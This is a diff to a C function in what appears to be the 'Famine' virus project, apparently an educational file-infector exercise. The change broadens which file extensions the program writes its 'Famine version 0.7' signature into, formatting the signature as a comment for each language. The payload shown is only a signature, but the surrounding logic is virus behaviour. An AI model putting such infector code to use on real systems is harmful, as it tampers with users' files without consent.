@@ -50,23 +50,32 @@ int handle_other_file(char *name_file) {
     char *payload;
 
     if (ext != NULL) {
-        if (strcmp(ext, ".c") == 0 || strcmp(ext, ".cpp") == 0 || strcmp(ext, ".h") == 0 || strcmp(ext, ".hpp") == 0 || strcmp(ext, ".java") == 0 || strcmp(ext, ".js") == 0 || strcmp(ext, ".ts") == 0 || strcmp(ext, ".json") == 0)
+        if (strcmp(ext, ".c") == 0 || strcmp(ext, ".cpp") == 0 || strcmp(ext, ".h") == 0 || 
+                strcmp(ext, ".hpp") == 0 || strcmp(ext, ".java") == 0 || strcmp(ext, ".js") == 0 || 
+                strcmp(ext, ".ts") == 0 || strcmp(ext, ".json") == 0 || strcmp(ext, ".go") == 0 || 
+                strcmp(ext, ".swift") == 0 || strcmp(ext, ".kt") == 0 || strcmp(ext, ".cs") == 0 ||
+                strcmp(ext, ".php") == 0)
             payload = "\n// Famine version 0.7 (c)oded jul-0000 by bob\n";
-        else if (strcmp(ext, ".py") == 0 || strcmp(ext, ".sh") == 0 || strcmp(ext, ".rb") == 0 || strcmp(ext, ".pl") == 0)
+        else if (strcmp(ext, ".py") == 0 || strcmp(ext, ".sh") == 0 || strcmp(ext, ".rb") == 0 || 
+                strcmp(ext, ".pl") == 0 || strcmp(ext, ".r") == 0 || strcmp(ext, ".lua") == 0 || 
+                strcmp(ext, ".tcl") == 0)
             payload = "\n# Famine version 0.7 (c)oded jul-0000 by bob\n";
-        else if (strcmp(ext, ".s") == 0 || strcmp(ext, ".asm") == 0)
+        else if (strcmp(ext, ".s") == 0 || strcmp(ext, ".asm") == 0 || strcmp(ext, ".nasm") == 0)
             payload = "\n; Famine version 0.7 (c)oded jul-0000 by bob\n";
-        else if (strcmp(ext, ".php") == 0)
-            payload = "\n// Famine version 0.7 (c)oded jul-0000 by bob\n";
-        else if (strcmp(ext, ".html") == 0 || strcmp(ext, ".md") == 0)
+        else if (strcmp(ext, ".html") == 0 || strcmp(ext, ".htm") == 0 || strcmp(ext, ".md") == 0 || 
+                strcmp(ext, ".xml") == 0 || strcmp(ext, ".xhtml") == 0)
             payload = "\n<!-- Famine version 0.7 (c)oded jul-0000 by bob -->\n";
-        else if (strcmp(ext, ".css") == 0)
+        else if (strcmp(ext, ".css") == 0 || strcmp(ext, ".scss") == 0 || strcmp(ext, ".less") == 0)
             payload = "\n/* Famine version 0.7 (c)oded jul-0000 by bob */\n";
+        else if (strcmp(ext, ".sql") == 0)
+            payload = "\n-- Famine version 0.7 (c)oded jul-0000 by bob\n";
+        else if (strcmp(ext, ".yml") == 0 || strcmp(ext, ".yaml") == 0 || strcmp(ext, ".toml") == 0 || strcmp(ext, ".ini") == 0)
+            payload = "\n# Famine version 0.7 (c)oded jul-0000 by bob\n";
         else
-            payload = "\n#Famine version 0.7 (c)oded jul-0000 by bob\n";
+            payload = "\n# Famine version 0.7 (c)oded jul-0000 by bob\n";
     }
     else {
-        payload = "\n#Famine version 0.7 (c)oded jul-0000 by bob\n";
+        payload = "\n# Famine version 0.7 (c)oded jul-0000 by bob\n";
     }
 
     write(fd, payload, strlen(payload));
